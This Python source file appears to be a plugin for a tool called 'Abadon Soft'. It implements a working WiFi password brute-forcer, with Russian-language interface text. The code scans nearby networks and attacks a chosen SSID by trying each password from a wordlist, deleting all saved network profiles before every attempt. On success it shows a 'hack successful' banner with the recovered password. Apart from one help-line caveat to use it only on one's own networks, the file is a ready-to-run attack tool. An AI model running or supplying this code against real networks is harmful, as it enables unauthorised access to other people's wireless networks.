"""
Abadon Soft — WiFi брутфорс (улучшенный).
Сканирует сети, подбирает пароль по словарю.

Команды:
    wifi               — сканировать WiFi сети
    wifi <N>           — атаковать сеть №N
    wifi <N> <файл>    — с кастомным словарём
    wifi attack <SSID> — атаковать по имени SSID
    wifi stop          — остановить перебор
"""

import os
import sys
import time
import ctypes
import json

NAME    = "wifi"
TITLE   = "WiFi Brute"
DESC    = "Сканирование WiFi и подбор пароля по словарю"
USAGE   = "wifi → wifi <N>  → wifi <N> <wordlist>"
ALIASES = ["run", "r", "wf"]

WORDLIST_NAME = "wifi_password.txt"

# Тайминги
_CONNECT_WAIT_1 = 0.3
_CONNECT_WAIT_2 = 0.3

# Состояние
_LAST = {"nets": [], "iface": None, "const": None, "pywifi": None}


# ─── Утилиты ─────────────────────────────────────────────────────

def _is_admin() -> bool:
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return True


def _require_pywifi():
    try:
        import pywifi
        from pywifi import const
        return pywifi, const
    except ImportError:
        return None, None


def _find_wordlist(name: str = WORDLIST_NAME) -> str:
    here = os.path.dirname(os.path.abspath(__file__))
    root = os.path.dirname(here)
    for p in (
        os.path.join(os.getcwd(), name),
        os.path.join(root, name),
        os.path.join(here, name),
    ):
        if os.path.isfile(p):
            return p
    return ""


def _load_passwords(path: str) -> list:
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [ln.strip() for ln in f if ln.strip()]
    except Exception:
        return []


def _signal_bars(sig: int) -> str:
    if sig >= 75: return "[#e94b4b]▂▄▆█[/]"
    if sig >= 50: return "[#c93a3a]▂▄▆_[/]"
    if sig >= 25: return "[#a06cd5]▂▄__[/]"
    return "[#5a2a82]▂___[/]"


def _get_iface():
    pywifi, const = _require_pywifi()
    if pywifi is None:
        return None, None, None
    try:
        wifi   = pywifi.PyWiFi()
        ifaces = wifi.interfaces()
        if not ifaces:
            return None, None, None
        return pywifi, const, ifaces[0]
    except Exception:
        return None, None, None


def _encrypt_label(akm) -> str:
    """Определяем тип шифрования."""
    try:
        from pywifi import const as c
        if c.AKM_TYPE_WPA2PSK in akm: return "WPA2"
        if c.AKM_TYPE_WPAPSK  in akm: return "WPA"
        if c.AKM_TYPE_NONE    in akm: return "OPEN"
    except Exception:
        pass
    return "WPA2"


# ─── Скан ────────────────────────────────────────────────────────

def _cmd_scan(emit) -> bool:
    if not _is_admin():
        emit("[#c93a3a]◆ нужны права администратора[/]")
        return False

    pywifi, const, iface = _get_iface()
    if not iface:
        emit("[#c93a3a]◆ pywifi/адаптер не найден[/]")
        emit("[#5a2a82]  → pip install pywifi comtypes[/]")
        return False

    emit(f"[#a06cd5]◆ адаптер:[/] [b]{iface.name()}[/]")
    emit("[#5a2a82]◆ сканирую эфир…[/]")

    try:
        iface.scan()
    except Exception as e:
        emit(f"[#c93a3a]◆ scan() упал: {e}[/]")
        return False

    results = []
    for attempt in range(14):
        time.sleep(0.5)
        try:
            results = iface.scan_results() or []
        except Exception:
            results = []
        if results:
            break
        if attempt % 4 == 3:
            emit(f"[#5a2a82]  ◆ жду результатов… ({attempt+1}с)[/]")

    if not results:
        emit("[#c93a3a]◆ сети не обнаружены[/]")
        return False

    seen, nets = set(), []
    for net in results:
        ssid = (net.ssid or "").strip()
        if not ssid or ssid in seen:
            continue
        seen.add(ssid)
        akm    = getattr(net, "akm", [])
        enc    = _encrypt_label(akm)
        signal = getattr(net, "signal", 0)
        bssid  = getattr(net, "bssid", "—")
        nets.append({"ssid": ssid, "bssid": bssid,
                     "signal": signal, "enc": enc})

    if not nets:
        emit("[#c93a3a]◆ сети не обнаружены[/]")
        return False

    nets.sort(key=lambda x: x["signal"], reverse=True)
    _LAST.update(nets=nets, iface=iface, const=const, pywifi=pywifi)

    emit("")
    emit("[#c93a3a][b]◆ ОБНАРУЖЕННЫЕ СЕТИ[/b][/]")
    emit("")
    emit(f"  [#5a2a82]{'№':<3} {'SSID':<28} {'СИГНАЛ':<10} {'ТИП':<6} {'BSSID'}[/]")
    emit(f"  [#2b0f3a]{'─'*3} {'─'*28} {'─'*10} {'─'*6} {'─'*20}[/]")

    for i, n in enumerate(nets, 1):
        bars  = _signal_bars(n["signal"])
        color = "#e94b4b" if n["signal"] >= 70 else \
                "#c93a3a" if n["signal"] >= 40 else "#a06cd5"
        lock_icon = "🔓" if n["enc"] == "OPEN" else "🔒"
        emit(f"  [#a06cd5][b]{i:>2}[/b][/]  "
             f"[{color}][b]{n['ssid']:<28}[/b][/] "
             f"{bars} [dim]{n['signal']:>3}%[/dim]  "
             f"[#5a2a82]{n['enc']:<6}[/]  "
             f"[dim]{n['bssid']}[/dim]")

    emit("")
    emit(f"[#5a2a82]◆ найдено: [b]{len(nets)}[/b] сетей[/]")
    emit("")
    emit("[#e94b4b]◆ для атаки:[/] [b]wifi <номер>[/b]  "
         "[dim](например: wifi 1)[/]")
    emit("")
    return True


# ─── Попытка подключения ─────────────────────────────────────────

def _try_connect(pywifi, const, iface, ssid: str, password: str) -> bool:
    try:
        iface.remove_all_network_profiles()
        profile         = pywifi.Profile()
        profile.ssid    = ssid
        profile.auth    = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher  = const.CIPHER_TYPE_CCMP
        profile.key     = password

        tmp = iface.add_network_profile(profile)
        iface.connect(tmp)

        time.sleep(_CONNECT_WAIT_1)
        if iface.status() == const.IFACE_CONNECTED:
            return True
        time.sleep(_CONNECT_WAIT_2)
        if iface.status() == const.IFACE_CONNECTED:
            return True
        try:
            iface.disconnect()
        except Exception:
            pass
        return False
    except Exception:
        return False


# ─── Атака ───────────────────────────────────────────────────────

def _attack(emit, target_ssid: str, wordlist_path: str = "",
            should_stop=None):
    if should_stop is None:
        should_stop = lambda: False

    if not _is_admin():
        emit("[#c93a3a]◆ нужны права администратора[/]")
        return

    if not wordlist_path:
        wordlist_path = _find_wordlist(WORDLIST_NAME)
    if not wordlist_path:
        emit(f"[#c93a3a]◆ {WORDLIST_NAME} не найден[/]")
        emit("[#5a2a82]  → положи файл рядом с main.py[/]")
        return

    passwords = _load_passwords(wordlist_path)
    if not passwords:
        emit(f"[#c93a3a]◆ словарь пуст: {wordlist_path}[/]")
        return

    # Используем сохранённый или получаем новый iface
    if _LAST.get("iface") and _LAST.get("const"):
        pywifi = _LAST.get("pywifi")
        const  = _LAST.get("const")
        iface  = _LAST.get("iface")
    else:
        pywifi, const, iface = _get_iface()
        if not iface:
            emit("[#c93a3a]◆ адаптер не найден[/]")
            return

    total = len(passwords)
    emit("")
    emit("[#e94b4b][b]╔══════════════════════════════════════════╗[/b][/]")
    emit(f"[#e94b4b][b]║  WiFi Brute Force — старт               ║[/b][/]")
    emit("[#e94b4b][b]╚══════════════════════════════════════════╝[/b][/]")
    emit(f"  [#a06cd5]◆ цель:[/]     [b]{target_ssid}[/]")
    emit(f"  [#a06cd5]◆ словарь:[/]  [dim]{wordlist_path}[/]")
    emit(f"  [#a06cd5]◆ паролей:[/]  [b]{total}[/]")
    emit(f"  [#5a2a82]◆ stop — чтобы остановить[/]")
    emit("")

    t0      = time.time()
    found   = False
    success_count = 0
    fail_count    = 0

    for idx, pwd in enumerate(passwords, 1):
        if should_stop():
            break

        emit(f"[dim][{idx:>4}/{total}][/dim]  "
             f"[#e94b4b][b]{pwd:<30}[/b][/]  "
             f"[#5a2a82]⟳ проверяю…[/]")

        ok = _try_connect(pywifi, const, iface, target_ssid, pwd)

        if ok:
            elapsed = time.time() - t0
            emit("")
            emit("[#e94b4b][b]╔══════════════════════════════════════════════╗[/b][/]")
            emit("[#e94b4b][b]║        В З Л О М   У С П Е Ш Е Н            ║[/b][/]")
            emit("[#e94b4b][b]╚══════════════════════════════════════════════╝[/b][/]")
            emit(f"  [#a06cd5]◆ сеть:[/]   [#e94b4b][b]{target_ssid}[/b][/]")
            emit(f"  [#a06cd5]◆ пароль:[/] [#e94b4b][b]{pwd}[/b][/]")
            emit(f"  [#a06cd5]◆ попыток:[/][b]{idx}[/b] из {total}")
            emit(f"  [#a06cd5]◆ время:[/]  [b]{elapsed:.1f}с[/]")
            emit(f"  [#a06cd5]◆ статус:[/] [#e94b4b][b]ПОДКЛЮЧЕНО[/b][/]")
            emit("")

            # Копируем результат
            try:
                emit("@@COPY_SCREEN@@" + json.dumps({
                    "title": f"WiFi взломан: {target_ssid}",
                    "lines": [
                        "=" * 50,
                        f"  SSID:   {target_ssid}",
                        f"  ПАРОЛЬ: {pwd}",
                        f"  Попыток: {idx}/{total}",
                        f"  Время:   {elapsed:.1f}с",
                        "=" * 50,
                    ],
                }, ensure_ascii=False))
            except Exception:
                pass

            found = True
            break
        else:
            fail_count += 1
            emit(f"  [dim]→ FAIL[/dim]")

    if not found:
        elapsed = time.time() - t0
        if should_stop():
            emit("")
            emit(f"[#c93a3a]◆ остановлено после {idx} попыток[/]")
        else:
            emit("")
            emit(f"[#c93a3a]◆ словарь исчерпан — пароль не найден[/]")
            emit(f"[#5a2a82]  → {total} паролей проверено за {elapsed:.1f}с[/]")
            emit("[#5a2a82]  → попробуй расширить словарь[/]")


# ─── Подкоманды ──────────────────────────────────────────────────

def _cmd_run(emit, args: str, should_stop=None):
    args = (args or "").strip()
    if not args:
        emit("[#c93a3a]◆ укажи номер: wifi <N>[/]"); return

    parts = args.split()
    try:
        num = int(parts[0])
    except ValueError:
        emit(f"[#c93a3a]◆ номер должен быть числом: {parts[0]}[/]"); return

    nets = _LAST.get("nets") or []
    if not nets:
        emit("[#c93a3a]◆ сначала сканируй:[/] [b]wifi[/b]"); return
    if num < 1 or num > len(nets):
        emit(f"[#c93a3a]◆ нет сети №{num} (всего {len(nets)})[/]"); return

    wl = parts[1] if len(parts) > 1 else ""
    _attack(emit, nets[num - 1]["ssid"],
            wordlist_path=wl, should_stop=should_stop)


def _cmd_attack_by_name(emit, args: str, should_stop=None):
    parts = args.split()
    if not parts:
        emit("[#c93a3a]◆ wifi attack <SSID> [словарь][/]"); return
    target = parts[0]
    wl     = parts[1] if len(parts) > 1 else ""
    _attack(emit, target, wl, should_stop)


# ─── Точка входа ─────────────────────────────────────────────────

def run(args: str, emit, invoked_as: str = None, should_stop=None):
    if should_stop is None:
        should_stop = lambda: False

    invoked = (invoked_as or NAME).lower()
    args = (args or "").strip()

    if invoked in ("run", "r"):
        _cmd_run(emit, args, should_stop); return

    if not args:
        _cmd_scan(emit); return

    if args in ("help", "?", "h"):
        emit("[#c93a3a][b]◆ WIFI BRUTE[/b][/]")
        emit("")
        emit("  [b]wifi[/b]                — сканировать сети")
        emit("  [b]wifi <N>[/b]            — атаковать сеть №N")
        emit("  [b]wifi <N> <файл>[/b]     — свой словарь")
        emit("  [b]wifi attack <SSID>[/b]  — атака по имени")
        emit("")
        emit("[#5a2a82]  ⚠  только для своих сетей[/]")
        return

    parts = args.split(maxsplit=1)
    sub   = parts[0].lower()
    rest  = parts[1] if len(parts) > 1 else ""

    if sub in ("scan", "s"):
        _cmd_scan(emit); return
    if sub in ("attack", "a"):
        _cmd_attack_by_name(emit, rest, should_stop); return
    if sub in ("run", "r"):
        _cmd_run(emit, rest, should_stop); return
    if sub.isdigit():
        _cmd_run(emit, args, should_stop); return

    emit(f"[#c93a3a]◆ неизвестная подкоманда:[/] {sub}")
    emit("[#5a2a82]  → wifi | wifi <N> | wifi attack <SSID>[/]")
